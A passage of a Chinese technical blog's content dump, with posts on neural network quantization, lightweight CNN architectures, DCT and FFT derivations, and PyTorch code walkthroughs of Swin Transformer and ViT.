不对bias进行quantization，而是直接使用浮点域的bias和反量化之后的weight、activation乘积进行相加。相加完毕之后再对结果进行量化。  但同样地，我们也可以在整数域进行带bias的推理。我们以本题的场景为例（只对最后一层进行量化），最后一层在浮点域的推理可以表示为：\n$$ O_n = W_nO_{n-1} + b_n $$\n量化之后的表示为： $$ O_n \\approx S_{W_n}S_{O_{n-1}}(W_{nq}O_{(n-1)q} + b_n) $$\n据此可以直接得出$b_n$的量化因子为：\n$$ S_{b_n} = S_{W_n}S_{O_{n-1}} = S_{W_n}S_I\\prod_{k=1}^{n-1}(S_kS_{W_k}) $$\ncode 本节只呈现一些关键代码\npoint 1: 量化权重 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  from typing import Tuple def quantized_weights(weights: torch.Tensor, bit: int=8, actual=True) -\u0026gt; Tuple[torch.Tensor, float]: if actual: maxval = torch.max(weights) minval = torch.min(weights) else: mu = torch.mean(weights) sigma = torch.std(weights) maxval = mu + 3 * sigma minval = mu - 3 * sigma maxval = torch.max(-minval, maxval) scale = maxval / (2 ** (bit - 1)) result = torch.round(weights / scale) return torch.clamp(result, min=-2**(bit-1), max=2**(bit-1)-1), scale   本节作者在确定数据范围时尝试了两种方法：min/max法和3-sigma法。由于LeNet的权重分布基本类似于正态分布，所以两种策略差距不是很大。\npoint2: 量化激活 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  def quantize_activations(activations: np.ndarray, n_w: float, n_initial_input: float, ns: List[Tuple[float, float]], bits = 8) -\u0026gt; float: maxval = np.max(activations) minval = np.min(activations) n_a = (maxval - minval) / (2 ** bits) if len(ns) == 0: scale = n_a / (n_initial_input * n_w) else: div = 1 for n in ns: div *= n[0] * n[1] scale = n_a / (n_initial_input * n_w * div) return scale   此处的n_w指代$S_{W_i}$，n_a指代$S_{O_i}$，对于第$i(i\\ge2)$层，ns列表中存储的若干对元素为$[S_{W_1},S_1], \\cdots, [S_{W_{i-1}},S_{i-1}]$，套用前文关于$S_i$的公式即得。\npoint3: 正向传播 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  def forward(self, x: torch.Tensor, bits: int = 8) -\u0026gt; torch.Tensor: # You can access the output activation scales like this: input_scale = self.input_scale fc1_output_scale = self.fc1.output_scale fc2_output_scale = self.fc2.output_scale fc3_output_scale = self.fc3.output_scale conv1_output_scale = self.conv1.output_scale conv2_output_scale = self.conv2.output_scale I = x I_q = torch.clamp(torch.round(I / input_scale), min=-2**(bits-1), max=2**(bits-1)-1) R_1 = self.pool(F.relu(self.conv1(I_q))) O_1q = torch.clamp(torch.round(R_1 / conv1_output_scale), min=-2**(bits-1), max=2**(bits-1)-1) R_2 = self.pool(F.relu(self.conv2(O_1q))) O_2q = torch.clamp(torch.round(R_2 / conv2_output_scale), min=-2**(bits-1), max=2**(bits-1)-1) O_2q = O_2q.view(-1, 16 * 5 * 5) R_3 = F.relu(self.fc1(O_2q)) O_3q = torch.clamp(torch.round(R_3 / fc1_output_scale), min=-2**(bits-1), max=2**(bits-1)-1) R_4 = F.relu(self.fc2(O_3q)) O_4q = torch.clamp(torch.round(R_4 / fc2_output_scale), min=-2**(bits-1), max=2**(bits-1)-1) R_5 = self.fc3(O_4q) O_5q = torch.clamp(torch.round(R_5 / fc3_output_scale), min=-2**(bits-1), max=2**(bits-1)-1) return O_5q.to(device)   注意clamp操作和round操作插入的位置。\npoint4: 量化偏置 1 2 3 4 5  def quantized_bias(bias: torch.Tensor, n_w: float, n_initial_input: float, ns: List[Tuple[float, float]], bits: int=32) -\u0026gt; torch.Tensor: scale = n_w * n_initial_input for n in ns: scale *= n[0] * n[1] return torch.clamp((bias / scale).round(), min=MIN_32B_SINT, max=MAX_32B_SINT)   同point 2的处理方法。\nresult 将一些基本结果列入下表：\n   权重bit 激活bit 偏置bit acc     32 32 \\ 55.35%   8 32 \\ 55.33%   4 32 \\ 53.13%   2 32 \\ 31.27%   8 8 \\ 54.80%   32 32 32 55.73%   8 8 32 49.77%   8 8 8(最后一层) 55.64%    这里值得一提的是关于偏置的结论：当一个模型有偏置时，如果只量化权重和激活而无视偏置，将会有较大的精度下降，这是因为量化之后整型的权重和激活之积和浮点型的偏置所在的值域有较大的差异。而对最后一层的偏置进行量化后，两者的值域之间的差异大大减少，偏置真正起到了其作用，最后模型输出的误差有所减小，因而精度有所恢复。\n不过在实际程序中大多采用“不对bias进行quantization，而是直接使用浮点域的bias和反量化之后的weight、activation乘积进行相加，相加完毕之后再对结果进行量化”的方法。考虑到偏置相加的计算开销要远远小于权重相乘，这样的简便做法是可以被接受的。\nreference   Quantization and Training of Neural Networks for Efficient Integer-Arithmetic-Only Inference\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n Nvidia PPT for quantization\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n   ","date":"2022-12-24T00:00:00Z","permalink":"https://ther-nullptr.github.io/posts/hardware-machine-learning/ee-290-lab-1/","title":"EE290-2 LAB1 quantization"},{"content":"基本概念 FLOPs：注意s小写，是FLoating point OPerations的缩写（s表复数），意指浮点运算数，理解为计算量。可以用来衡量模型的复杂度。\nFLOPS：注意全大写，是floating point operations per second的缩写，意指每秒浮点运算次数，理解为计算速度。是一个衡量硬件性能的指标。\nAlexNet AlexNet虽然不是轻量级卷积，但是其引入了分组卷积的概念：\n分组卷积的输出特征图的每个通道，只和输入特征图的一部分通道有关，而这部分通道，就是一个分组 (Group)。如下图所示，假设输入特征图的尺寸为 Cin×H×W，分为3组进行分组卷积，那么，对于每一组，输出特征图的通道数是 Cout3 ，卷积核大小为 Cin×K×K ，最后只需要将各个分组的计算结果按照通道进行连接(Concat)即可。\n分组卷积可以将参数量减少为之前的$\\frac{1}{G}$，其中$G$为分组数量。\nSqueezeNet  在卷积层总数量不变的情况下，将网络中的大部分卷积层的卷积核大小设置为1x1。 引入一个1x1卷积层进行通道降维，减少3x3卷积的输入通道数以减少其参数 量（减少的参数量比额外引入的1x1卷积层参数量更多）。 在网络的更深层进行降采样，让浅层的激活值具有更大尺度，以提升性能。  具体来说，压缩部分为一个1×1的卷积层，将输入的激活值压缩到更少的通道数目，后续的拓展部分则由两组在通道上并列的1×1与3×3卷积组成，将通道拓展回原本的数目。\nMobileNetV1 核心思想：MobileNetV1就是把VGG中的标准卷积层换成深度可分离卷积就可以了。\n深度可分离卷积就是将普通卷积拆分成为一个深度卷积和一个逐点卷积。\n一个输入通道数为$C_{in}$、输出通道数为$C_{out}$、卷积核大小为$K$的卷积层可以分解为逐深度的（通道维 度）和逐点的（空间维度）的两个卷积。逐深度卷积层的输入输出通道均为$C_{in}$，卷积核大小为$K\\times K$，个数为$C_{in}$，逐点卷积是一个输入通道数为$C_{in}$、输出通道数为$C_{out}$的$1\\times1$的卷积层。\n与传统卷积的对比如下：\n    计算量 参数量     普通卷积 $C_{in}\\times C_{out}\\times W \\times H \\times K^2$ $C_{in}\\times C_{out}\\times K^2$   深度可分离卷积 $C_{in}\\times W \\times H \\times K^2 + C_{in}\\times C_{out}$ $C_{in}\\times K^2 + C_{out}\\times C_{in}$    需要指出的是，论文中使用的激活函数是ReLU6。\nMobileNetV2 MobileNetV1中的深度可分离卷积表征能力相对受限，例如，网络的某个部分出现全0，这主要由ReLU引起。据此，MobileNetV2提出了提出了线性瓶颈层和逆残差结构。\nLinear Bottleneck 对低维度做ReLU运算，很容易造成信息的丢失。而在高维度进行ReLU运算的话，信息的丢失则会很少。因此，我们将最后一层的ReLU6换成线性激活函数。\nInverted residuals 深度卷积本身没有改变通道的能力，来的是多少通道输出就是多少通道。如果来的通道很少的话，DW深度卷积只能在低维度上工作，这样效果并不会很好。可以在DW深度卷积之前使用PW卷积进行升维，再在一个更高维的空间中进行卷积操作来提取特征：\n对比一下V1和V2的层结构：\nMobileNetV3  0.网络的架构基于NAS实现的MnasNet（效果比MobileNetV2好） 1.引入MobileNetV1的深度可分离卷积 2.引入MobileNetV2的具有线性瓶颈的倒残差结构 3.引入基于squeeze and excitation结构的轻量级注意力模型(SE) 4.使用了一种新的激活函数h-swish(x) 5.网络结构搜索中，结合两种技术：资源受限的NAS（platform-aware NAS）与NetAdapt 6.修改了MobileNetV2网络端部最后阶段  ShuffleNet ShuffleNet更关注计算量的优化，即如何提升通道数又同时保持模型的计算量较小。其核心设计理念是分组卷积与通道重排。\n分组卷积的思想同AlexNet，ShuffleNet更进一步，将MobileNet的1x1逐点卷积层也采取分组卷积的方式：\n这会带来一个问题：由于分组卷积的各个组的计算独立，如果连续两个卷积层都使用 了分组卷积，会导致信息无法在组间交互。对此，ShuffleNet采用通道重排策略：\nShuffleNetV2 本文提出了轻量级模型设计的4种准则：\n 同等通道大小最小化内存访问量 过量使用组卷积会增加MAC 网络碎片化会降低并行度 不能忽略元素级操作  ShuffleNet几乎踩中了以上所有的坑，对此V2模型给出如下解决方案：\n 引入channel spliting，在输入通道维度切分并仅传给两个分支，其中一个分支使用直 通。另外一个分支为三个有着同样输入输出通道数的卷积，且两个1x1卷积不使用分组卷积。 最后将两个分支的输出通道做拼接和重排、而不是逐元素相加，而且通道的拼接-重排-切分被合并为一个操作。  GhostNet 在一个训练好的深度神经网络中，通常会包含丰富甚至冗余的特征图，以保证对输入数据有全面的理解。作者提出了一种新颖的Ghost模块，可以使用更少的参数来生成更多特征图。具体来说，深度神经网络中的普通卷积层将分为两部分。第一部分涉及普通卷积，但是将严格控制它们的总数。给定第一部分的固有特征图，然后将一系列简单的线性运算应用于生成更多特征图。\ncode 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73  import torch class CNN(torch.nn.Module): def __init__(self, in_ch: int, out_ch: int, groups: int): super(CNN, self).__init__() self.conv = torch.nn.Conv2d(in_channels=in_ch, out_channels=out_ch, kernel_size=3, stride=1, padding=1) def forward(self, x:torch.Tensor): return self.conv(x) class AlexNetCNN(torch.nn.Module): def __init__(self, in_ch: int, out_ch: int, groups: int): super(AlexNetCNN, self).__init__() self.conv = torch.nn.Conv2d(in_channels=in_ch, out_channels=out_ch, kernel_size=3, stride=1, padding=1, groups=groups) def forward(self, x:torch.Tensor): return self.conv(x) class SqueezeNetCNN(torch.nn.Module): def __init__( self, inplanes: int, squeeze_planes: int, expand1x1_planes: int, expand3x3_planes: int ) -\u0026gt; None: super(SqueezeNetCNN, self).__init__() self.inplanes = inplanes self.squeeze = torch.nn.Conv2d(inplanes, squeeze_planes, kernel_size=1) self.squeeze_activation = torch.nn.ReLU(inplace=True) self.expand1x1 = torch.nn.Conv2d(squeeze_planes, expand1x1_planes, kernel_size=1) self.expand1x1_activation = torch.nn.ReLU(inplace=True) self.expand3x3 = torch.nn.Conv2d(squeeze_planes, expand3x3_planes, kernel_size=3, padding=1) self.expand3x3_activation = torch.nn.ReLU(inplace=True) def forward(self, x: torch.Tensor) -\u0026gt; torch.Tensor: x = self.squeeze_activation(self.squeeze(x)) return torch.cat([ self.expand1x1_activation(self.expand1x1(x)), self.expand3x3_activation(self.expand3x3(x)) ], 1) class MobileNetCNN(torch.nn.Module): def __init__(self, in_ch: int, out_ch: int): self.depth_conv = torch.nn.Conv2d(in_channels=in_ch, out_channels=in_ch, kernel_size=3, stride=1, padding=1, groups=in_ch) self.point_conv = torch.nn.Conv2d(in_channels=in_ch, out_channels=out_ch, kernel_size=1, stride=1, padding=0, groups=1) def forward(self, x:torch.Tensor): return(self.point_conv(self.depth_conv(x)))   ","date":"2022-11-02T00:00:00Z","permalink":"https://ther-nullptr.github.io/posts/cv/efficient-cnn/","title":"轻量级CNN"},{"content":"DCT DCT一般用于图像处理。我们使用L2距离来量化编码误差。为了便于观看，我们倾向于保留低频分量。被截断的系数的能量越小，编码误差越小。\n如果将DFT作用于图像处理有以下缺陷：由于DFT的信号由周期延拓得到，使得包络和相位不连续，引入高频分量。对此，可以将原序列对称扩展到2N个点，然后做2N点周期延拓。\n首先列出DCT的定义： $$ X_{DCT}[k] = \\begin{cases} \\sqrt{\\frac{1}{N}}\\sum_{n=0}^{N-1}x[n],k=0\\ \\sqrt{\\frac{2}{N}}\\sum_{n=0}^{N-1}x[n]{\\rm cos}(\\frac{\\pi}{2N}k(2n+1)), elsewhere \\ \\end{cases} $$ 为什么要有k=0的特例？保范。\n这个公式实际上来源于2N点延拓的DFT： $$ X_2[k]=\\sum_{n=0}^{2N-1}x_2[n]W_{2N}^{kn}=\\sum_{n=0}^{N-1}xn = 2e^{j\\frac{\\pi}{2N}k}\\sum_{n=0}^{N-1}x[n]{\\rm cos}(\\frac{\\pi}{2N}k(2n+1)) $$ 可以看到，这个公式与DCT的公式只有一个系数的区别。\n $e^{j\\frac{\\pi}{2N}k}$这个系数来源于何处？实际上观察2N点延拓后的序列，它并非完全偶对称的，其DFT也并非实序列。这一系数可以看做一个平移系数。\n DCT的快速算法：\n 2N点DFT$X_1[k]$。 取$\\frac{1}{\\sqrt{N}}Re{X_1[k]e^{-j\\pi\\frac{k}{2N}}}$，按照k=0调整系数。  ","date":"2022-10-25T00:00:00Z","permalink":"https://ther-nullptr.github.io/posts/digital_signal_processing/dct/","title":"DCT"},{"content":"method 整体上看，Swin的结构类似于PVT，呈现出一种金字塔架构。\n为什么金字塔结构如此重要？FPN理论认为，不同尺寸的特征图拥有不同的感受野，同时还有池化操作，从而能够很好地处理这个物体不同尺寸的这个问题（这点可以参考论文U-Net）。这样的模型更适合使用密集型任务。\ncode Patch Merging 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  def forward(self, x): \u0026#34;\u0026#34;\u0026#34; x: B, H*W, C \u0026#34;\u0026#34;\u0026#34; print(x.shape) H, W = self.input_resolution B, L, C = x.shape assert L == H * W, \u0026#34;input feature has wrong size\u0026#34; assert H % 2 == 0 and W % 2 == 0, f\u0026#34;x size ({H}*{W}) are not even.\u0026#34; x = x.view(B, H, W, C) x0 = x[:, 0::2, 0::2, :] # B H/2 W/2 C x1 = x[:, 1::2, 0::2, :] # B H/2 W/2 C x2 = x[:, 0::2, 1::2, :] # B H/2 W/2 C x3 = x[:, 1::2, 1::2, :] # B H/2 W/2 C x = torch.cat([x0, x1, x2, x3], -1) # B H/2 W/2 4*C x = x.view(B, -1, 4 * C) # B H/2*W/2 4*C x = self.norm(x) x = self.reduction(x) return x   1  self.reduction = nn.Linear(4 * dim, 2 * dim, bias=False)   这部分首先将特征图不同位置的信息提取出来，组成4张新的特征图，然后在通道维度上进行拼接，通道数就扩大为了原来的4倍，最后通过投影将通道数缩小为之前的一半。如下图：\n提取方法如下：\nSwin Transformer Block 首先需要说明的是，两个transformer层合在一起才算是swin transformer的一个基本单元。两次attention作用的位置不同：\nWindow Based Attention 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28  def forward(self, x, mask=None): \u0026#34;\u0026#34;\u0026#34; Args: x: input features with shape of (num_windows*B, N, C) mask: (0/-inf) mask with shape of (num_windows, Wh*Ww, Wh*Ww) or None \u0026#34;\u0026#34;\u0026#34; # [128, 49, 96] B_, N, C = x.shape qkv = self.qkv(x).reshape(B_, N, 3, self.num_heads, C // self.num_heads).permute(2, 0, 3, 1, 4) q, k, v = qkv[0], qkv[1], qkv[2] # make torchscript happy (cannot use tensor as tuple) q = q * self.scale attn = (q @ k.transpose(-2, -1)) if mask is not None: nW = mask.shape[0] attn = attn.view(B_ // nW, nW, self.num_heads, N, N) + mask.unsqueeze(1).unsqueeze(0) attn = attn.view(-1, self.num_heads, N, N) attn = self.softmax(attn) else: attn = self.softmax(attn) attn = self.attn_drop(attn) x = (attn @ v).transpose(1, 2).reshape(B_, N, C) x = self.proj(x) x = self.proj_drop(x) return x   首先注意到输入的中间维度是49。这是因为swin的window size为7，这意味着一个window中一共包含49个patch。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44  def forward(self, x): H, W = self.input_resolution B, L, C = x.shape assert L == H * W, \u0026#34;input feature has wrong size\u0026#34; shortcut = x x = self.norm1(x) x = x.view(B, H, W, C) # [2, 56, 56, 96] # cyclic shift if self.shift_size \u0026gt; 0: # 3 shifted_x = torch.roll(x, shifts=(-self.shift_size, -self.shift_size), dims=(1, 2)) else: shifted_x = x # [2, 56, 56, 96] # partition windows x_windows = window_partition(shifted_x, self.window_size) # nW*B, window_size, window_size, C x_windows = x_windows.view(-1, self.window_size * self.window_size, C) # nW*B, window_size*window_size, C # [128, 49, 96] # W-MSA/SW-MSA attn_windows = self.attn(x_windows, mask=self.attn_mask) # nW*B, window_size*window_size, C # [128, 49, 96] # merge windows attn_windows = attn_windows.view(-1, self.window_size, self.window_size, C)\t# [128, 7, 7, 96] shifted_x = window_reverse(attn_windows, self.window_size, H, W) # B H\u0026#39; W\u0026#39; C # reverse cyclic shift if self.shift_size \u0026gt; 0: x = torch.roll(shifted_x, shifts=(self.shift_size, self.shift_size), dims=(1, 2)) else: x = shifted_x x = x.view(B, H * W, C) # [2, 3136, 96] # FFN x = shortcut + self.drop_path(x) x = x + self.drop_path(self.mlp(self.norm2(x))) return x   代码通过window_partation操作，将一个batch内的图片切分为若干个长为49的序列，然后在此序列中做attention，从而减小计算量。\nShift Window swin transformer在奇数层的window不shift，但在偶数层shift，这点在层数的设置上也可以看出：\n1 2 3 4 5 6 7 8  SwinTransformerBlock(dim=dim, input_resolution=input_resolution, num_heads=num_heads, window_size=window_size, shift_size=0 if (i % 2 == 0) else window_size // 2, mlp_ratio=mlp_ratio, qkv_bias=qkv_bias, qk_scale=qk_scale, drop=drop, attn_drop=attn_drop, drop_path=drop_path[i] if isinstance(drop_path, list) else drop_path, norm_layer=norm_layer)   对于cyclic shift的形象解释：\n而后是mask机制。在window shift之后，为了并行计算，图片仍然被划分为4个大块。但为了让图片避免与不相关的部分作自注意力，我们引入了一下掩码：\n消融实验表明shift window和pos embedding在检测任务上的有效性：\nSwin Transformer 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  def forward_features(self, x): x = self.patch_embed(x) if self.ape: x = x + self.absolute_pos_embed x = self.pos_drop(x) for layer in self.layers: x = layer(x) x = self.norm(x) # B L C # [2, 49, 768] x = self.avgpool(x.transpose(1, 2)) # B C 1 # [2, 768, 1] x = torch.flatten(x, 1) # [2, 768] return x def forward(self, x): x = self.forward_features(x) x = self.head(x) return x   类似resnet，swin会将最后一层特征图池化，而不是引入cls token。\n","date":"2022-10-22T00:00:00Z","permalink":"https://ther-nullptr.github.io/posts/cv/swin/","title":"Swin"},{"content":"FFT [TOC]\n按频率抽取 按频率抽取的情况下，$x[n]$是有序的。序列的分治通过$x[n]$的前后划分来实现。\n对于基$b$的FFT，我们不妨对$N$点序列进行以下划分：$x_1[n] = x[n],\\ x_2[n] = x[n+\\frac{N}{b}],\\ \u0026hellip; \\ x_b[n] = x[n+\\frac{(b-1)N}{b}],\\ n=0,1\u0026hellip;\\frac{N}{b}-1$。\n这样，我们就可以对DFT表达式进行分解: $$ X[k] = \\sum_{n=0}^{\\frac{N}{b}-1} [x_1[n]W_{N}^{nk} + x_2[n]W_{N}^{(n+\\frac{N}{b})k}+\u0026hellip;+x_b[n]W_N^{(n+\\frac{(b-1)N}{b})k}] $$ 使用$bk,bk+1,\u0026hellip;,bk+b-1$对$k$进行替换，就可以将$W_{N}^{nk}$替换为$W_{\\frac{N}{b}}^{nk}$，以实现递归。带入后的表达式如下： $$ X[bk+m] = \\sum_{n=0}^{\\frac{N}{b}-1}{x[n]+x[n+\\frac{N}{b}]W_{b}^{m}+x[n+\\frac{2N}{b}]W_{b}^{2m}\u0026hellip;+x[n+\\frac{(b-1)N}{b}]W_{b}^{(b-1)m}}W_{\\frac{N}{b}}^{nk}W_N^{nm} $$ 对于单位根系数有简单的记忆技巧：\n 基2 $(1,1)\\ (1,-1)$ 基3 $(1,1,1)\\ (1,W_3^1,W_3^2)\\ (1,W_3^2,W_3^4)$ 基4 $(1,1,1,1)\\ (1,-i,-1,i) \\ (1,-1,1,-1) \\ (1,i,-1,-i)$ 基n 可以考虑每一个分量分别是旋转$m$次，每次顺时针旋转$\\frac{2\\pi}{b}$所得到的  按时间抽取 按时间抽取的情况下，$X[k]$是有序的。序列的分治通过$x[n]$的模划分来实现。\n对于基$b$的FFT，其DFT可以写为如下形式： $$ X[k] = \\sum_{n=0}^{\\frac{N}{b}-1}x[bn]W_{\\frac{N}{b}}^{kn} + W_{N}^{k}\\sum_{n=0}^{\\frac{N}{b}-1}x[bn+1]W_{\\frac{N}{b}}^{kn} + \u0026hellip; + W_{N}^{(b-1)k}\\sum_{n=0}^{\\frac{N}{b}-1}x[bn+b-1]W_{\\frac{N}{b}}^{kn} $$ 使用$k,k+\\frac{N}{b},\u0026hellip;,k+\\frac{(b-1)N}{b}$对$k$进行代换，可以得到： $$ X[k+\\frac{mN}{b}] = \\sum_{n=0}^{\\frac{N}{b}-1}{x[bn]+x[bn+1]W_b^mW_N^k+x[bn+2]W_b^{2m}W_N^{2k}+\u0026hellip;+x[bn+b-1]W_b^{(b-1)m}W_N^{(b-1)k}}W_{\\frac{N}{b}}^{kn} $$\n应用 卷积 考虑一个长度为$L$的序列$x_1[n]$和一个长度为$P$的序列$x_2[n]$，卷积后的序列$y[n]$长度为$(L+P-1)$。将$y[n]$按照$N$点混叠得到$N$点循环卷积$\\bar y_N[n]$，当$N\u0026gt;L+P$，则可以将$X_1[k]X_2[k]$的循环卷积变换为$X_1(e^{j\\omega})X_2(e^{j\\omega})$的线性卷积（参考循环卷积的频域理解）。\n如果$P$较小，则需要对$x_2[n]$大量补0，导致计算量增大，对此需要对$x_1[n]$分段切割，表示为长度为$L$的平移有限长序列之和： $$ x[n] = \\sum_{r=0}^{\\infty}x_r[n-rL] \\ x_r[n] = x[n+rL], 0\\le n\\le L-1 $$ 分段计算线性卷积$y_r[n] = x_r[n] * h[n]$，使用$N\\ge L+P-1$点DFT计算线性卷积，得到的序列。由于每一个分割后的序列段长度为$L$，所以上述卷积长度为$L+P-1$，各序列段的卷积将会重叠$P-1$点。\n 重叠相加法：  将$x[n]$拆分成$L$点长的子段$x_r[n]$ 将$h[n]$补零做$L+P-1$点FFT$H_{L+P-1}[k]$ 将$x_r[n]$补零做$L+P-1$点FFT$X_r [k]$ $X_r[k]$和$H_{L+P-1}[k]$逐点相乘后作$L+P-1$点IFFT得$y_r[n]$ 平移$rL$点后重叠相加$y[n] = \\sum_{r=0}^{\\infty}y_r[n-rL]$   重叠保留法：  $h[n]$做$L$点FFT$H_L[k]$ 将$x[n]$分为长度为$L$的序列段，使得每个输人段与先 前的序列段重叠$(P-1)$点，也就是$x_r[n]=x[n+r(L-P+1)-P+1]\\ (0\\le n \\le L-1)$。 做卷积$y_{rp}[n]=h[n]*x_r[n]$（使用FFT和IFFT） 由于各段$x_r[n]$之间有交叠，所以$y_{rp}[n]$的重复段$0\\le n \\le P-2$段被去掉，新的子序列$y_r[n] = y_{rp}[n](P-1\\le n \\le L-1)$ 平移$r(L-P+1)$点后重叠相加$y[n] = \\sum_{r=0}^{\\infty}y_r[n-r(L-P+1)+P-1]$    相关 将一个序列进行反转共轭 ${\\rm FFT}{y^{}[-n]}=Y^{}[k]$ 后计算卷积。\n短时FFT $$ X[k,n+1]=(X[k,n]-x[n-W+1]+x[n+1])e^{j2\\pi\\frac{k}{W}} $$\n","date":"2022-10-18T00:00:00Z","permalink":"https://ther-nullptr.github.io/posts/digital_signal_processing/fft/","title":"FFT"},{"content":"method intro 我们首先介绍Transformer用于CV任务的难处：如何把二维的图像变为一维的序列。Transformer的计算复杂度与序列长度成正比。之前的工作为了解决这一问题，或者在图片的一个小区域使用transformer，或者在图片的长宽方向分别使用transformer。 ViT将图片分割为一个一个的patch，并将其linear embedding作为Transformer的输入。\nViT原论文中最核心的结论是，当拥有足够多的数据进行预训练的时候，ViT的表现就会超过CNN，突破transformer缺少归纳偏置的限制。\n Transformer相比CNN缺少归纳偏置，即先验知识。CNN的两种先验知识如下：\n 局部性：图片上相邻的区域具有相似的特征 平移不变性：$f(g(x))=g(f(x))$ 所以在小模型时CNN比transformer要好。   struct 可以看到，ViT的架构与bert几乎完全一样，只不过bert的输入是word embedding + positional embedding，ViT的输入是patch的linear projection + position embedding。不过需要指出的是，ViT是有监督的。 ViT的训练步骤如下：\n patch embedding：输入224x224，patch大小16x16，则输入序列长度为196，每个patch维度为16x16x3=768。经过768x768的linear projection之后维度为196x768。由于在前面需要加一个特殊字符[cls]，因此最终的维度是197x768。 positional encoding：与patch embedding相加得到最终结果，有以下三种：  1-D pos emb：只考虑patch flatten之后的相对位置信息 2-D pos emb：同时考虑X轴和y轴的信息 rel pos emb：   MHA  关于位置编码 不管使用哪种位置编码方式，模型的精度都很接近，甚至不适用位置编码，模型的性能损失也没有特别大。原因可能是ViT是作用在image patch上的，而不是image pixel，对网络来说这些patch之间的相对位置信息很容易理解。\n混合模型 在数据量较小时，混合模型比较占优，但较大时会被Transformer超越。\n图像分类方法 在原论文中，为了执行分类任务，作者在编码时引入了NLP界常用的[cls]标签，但也可以使用传统的average pooling，两种方法较为相近。\n数据集 ViT只在较大数据集上占据优势。\ncode MLP ViT中的MLP和Transformer中的没有太大的区别：\n1 2 3 4 5 6 7  MLPBlock( (0): Linear(in_features=768, out_features=3072, bias=True) (1): GELU(approximate=none) (2): Dropout(p=0.0, inplace=False) (3): Linear(in_features=3072, out_features=768, bias=True) (4): Dropout(p=0.0, inplace=False) )   当然，注意到代码中对MLP层进行了初始化：\n1 2 3 4 5 6 7 8 9 10  class MLPBlock(MLP): \u0026#34;\u0026#34;\u0026#34;Transformer MLP block.\u0026#34;\u0026#34;\u0026#34; def __init__(self, in_dim: int, mlp_dim: int, dropout: float): super().__init__(in_dim, [mlp_dim, in_dim], activation_layer=nn.GELU, inplace=None, dropout=dropout) for m in self.modules(): if isinstance(m, nn.Linear): nn.init.xavier_uniform_(m.weight) if m.bias is not None: nn.init.normal_(m.bias, std=1e-6)   Encoder Layer 基本结构如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  EncoderBlock( (ln_1): LayerNorm((768,), eps=1e-06, elementwise_affine=True) (self_attention): MultiheadAttention( (out_proj): NonDynamicallyQuantizableLinear(in_features=768, out_features=768, bias=True) ) (dropout): Dropout(p=0.0, inplace=False) (ln_2): LayerNorm((768,), eps=1e-06, elementwise_affine=True) (mlp): MLPBlock( (0): Linear(in_features=768, out_features=3072, bias=True) (1): GELU(approximate=none) (2): Dropout(p=0.0, inplace=False) (3): Linear(in_features=3072, out_features=768, bias=True) (4): Dropout(p=0.0, inplace=False) ) )   结构同样模仿transformer，此处不再赘述。\n1 2 3 4 5 6 7 8 9 10  def forward(self, input: torch.Tensor): torch._assert(input.dim() == 3, f\u0026#34;Expected (batch_size, seq_length, hidden_dim) got {input.shape}\u0026#34;) x = self.ln_1(input) x, _ = self.self_attention(query=x, key=x, value=x, need_weights=False) x = self.dropout(x) x = x + input y = self.ln_2(x) y = self.mlp(y) return x + y   Encoder Encoder在堆叠EncoderLayer的基础上，引入了最后一层的norm和embedding：\n1 2 3 4  def forward(self, input: torch.Tensor): torch._assert(input.dim() == 3, f\u0026#34;Expected (batch_size, seq_length, hidden_dim) got {input.shape}\u0026#34;) input = input + self.pos_embedding return self.ln(self.layers(self.dropout(input)))   这里要注意一下embedding。原文中尝试了3种embedding，但结果类似。此处看上去使用的是1d-embedding，形状为[1, 197, 768]。\nVision Transformer 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  def forward(self, x: torch.Tensor): # Reshape and permute the input tensor # [2, 3, 224, 224] x = self._process_input(x) # [2, 196, 768] n = x.shape[0] # Expand the class token to the full batch batch_class_token = self.class_token.expand(n, -1, -1) x = torch.cat([batch_class_token, x], dim=1) # [2, 197, 768] x = self.encoder(x) # [2, 197, 768] # Classifier \u0026#34;token\u0026#34; as used by standard language architectures x = x[:, 0] # [2, 768] x = self.heads(x) # [2, 1000] return x   首先重点关注图像的预处理部分self._process_input(x)：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  def _process_input(self, x: torch.Tensor) -\u0026gt; torch.Tensor: # [2, 3, 224, 224] n, c, h, w = x.shape p = self.patch_size n_h = h // p n_w = w // p # (n, c, h, w) -\u0026gt; (n, hidden_dim, n_h, n_w) x = self.conv_proj(x) # [2, 768, 14, 14] # (n, hidden_dim, n_h, n_w) -\u0026gt; (n, hidden_dim, (n_h * n_w)) x = x.reshape(n, self.hidden_dim, n_h * n_w) # [2, 768, 196] # (n, hidden_dim, (n_h * n_w)) -\u0026gt; (n, (n_h * n_w), hidden_dim) # The self attention layer expects inputs in the format (N, S, E) # where S is the source sequence length, N is the batch size, E is the # embedding dimension x = x.permute(0, 2, 1) # [2, 196, 768] return x   224x224的图像，16x16的patch，所以一共有196个patch。可以把它们看成一个“句子”，之后送入transformer，就和NLP、Speech里做得一样了。这里特别注意一下self.conv_proj(x)：\n1 2 3  self.conv_proj = nn.Conv2d( in_channels=3, out_channels=hidden_dim, kernel_size=patch_size, stride=patch_size )   注意到这里获取序列的方法是二维卷积而不是线性层。\n之后，我们将可学习参数self.class_token拼接到序列之前，投影时将分类token取出来即可用于分类。\n1  self.class_token = nn.Parameter(torch.zeros(1, 1, hidden_dim)) # torch.Size([2, 1, 768])   使用总结：\n1 2 3 4  img = torch.randn((2, 3, 224, 224)) vitimpl = vit_b_16() output = vitimpl(img) print(output.shape)   